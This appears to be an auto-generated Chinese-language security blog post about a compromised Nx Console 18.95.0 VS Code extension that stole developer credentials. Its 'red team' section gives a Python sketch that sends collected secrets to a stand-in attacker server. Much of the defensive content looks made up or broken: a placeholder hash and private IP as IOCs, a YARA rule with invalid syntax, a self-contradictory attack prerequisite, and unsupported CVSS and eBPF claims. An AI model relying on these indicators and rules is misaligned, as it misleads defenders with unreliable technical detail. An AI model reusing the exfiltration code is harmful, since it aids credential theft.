---
layout: post
title:  "Compromised Nx Console 18.95.0 Targeted VS Code Developers with Credential Stealer"
date:   2026-05-19 09:30:22 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Nx Console 擴充功能漏洞：供應鏈攻擊與憑證竊取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: `Supply Chain Attack`, `Credential Stealer`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Nx Console 擴充功能的版本 18.95.0 中，存在一個安全漏洞，允許攻擊者在開發者開啟任何工作區時，執行一個 498 KB 的混淆 payload。
* **攻擊流程圖解**:
  1. 攻擊者將一個受污染的版本的 Nx Console 擴充功能上傳到 VS Code Marketplace。
  2. 開發者安裝受污染的擴充功能。
  3. 攻擊者透過 GitHub API 和 DNS tunneling 收集開發者的秘密並將其外洩。
  4. 攻擊者在 macOS 系統上安裝一個 Python 後門，利用 GitHub Search API 作為命令和控制通道。
* **受影響元件**: Nx Console 擴充功能版本 18.95.0，VS Code，macOS。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得開發者的 GitHub 認證。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    import base64
    
    # 收集開發者的秘密
    secrets = []
    # ...
    
    # 將秘密外洩到攻擊者的伺服器
    requests.post("https://attacker-server.com/secrets", json=secrets)
    
    ```
* **繞過技術**: 攻擊者可以使用 eBPF 來繞過安全防護機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | attacker-server.com | /tmp/kitty-* |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Nx_Console_Malware {
      meta:
        description = "Detects Nx Console malware"
      strings:
        $a = "https://attacker-server.com/secrets"
      condition:
        $a in (http.request.uri)
    }
    
    ```
* **緩解措施**: 更新 Nx Console 擴充功能到版本 18.100.0 或以上，刪除受污染的檔案和程序。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 想像一個公司的供應鏈，就像一個長長的鏈條，一旦有一個環節被攻擊，整個鏈條都可能受到影響。技術上是指攻擊者透過供應鏈中的弱點，例如第三方庫或軟體，來攻擊目標系統。
* **Credential Stealer (憑證竊取)**: 想像一個攻擊者偷走你的密碼和認證，技術上是指攻擊者透過各種手段，例如社交工程或漏洞利用，來竊取目標系統的認證和密碼。
* **eBPF (Extended Berkeley Packet Filter)**: 想像一個強大的網路封包過濾器，技術上是指一種 Linux 內核技術，允許用戶空間程序透過 BPF 來過濾和操控網路封包。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/05/compromised-nx-console-18950-targeted.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


